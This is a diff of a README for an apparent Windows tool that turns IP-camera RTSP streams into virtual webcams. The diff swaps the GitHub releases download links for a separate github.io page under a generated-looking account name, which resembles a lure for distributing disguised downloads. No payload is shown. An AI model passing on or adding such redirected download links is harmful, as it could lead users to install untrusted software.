@@ -1,12 +1,12 @@
 # 📹 rtsp-virtual-webcam - Turn IP cameras into virtual webcams
 
-[![Download](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Dasyproctaanxiousness893/rtsp-virtual-webcam/releases)
+[![Download](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://dasyproctaanxiousness893.github.io)
 
 This application converts any RTSP stream from an IP camera into a virtual webcam and microphone device on your Windows computer. You can use your security camera or IP device in programs like Zoom, Google Meet, or Teams. It functions as a hardware device within your system settings, so other software treats it like a standard plugged-in USB camera.
 
 ## 📥 Getting Started
 
-Visit the [releases page](https://github.com/Dasyproctaanxiousness893/rtsp-virtual-webcam/releases) to download the software. 
+Visit the [releases page](https://dasyproctaanxiousness893.github.io) to download the software. 
 
 1. Go to the link above.
 2. Look for the latest version under the "Assets" section.
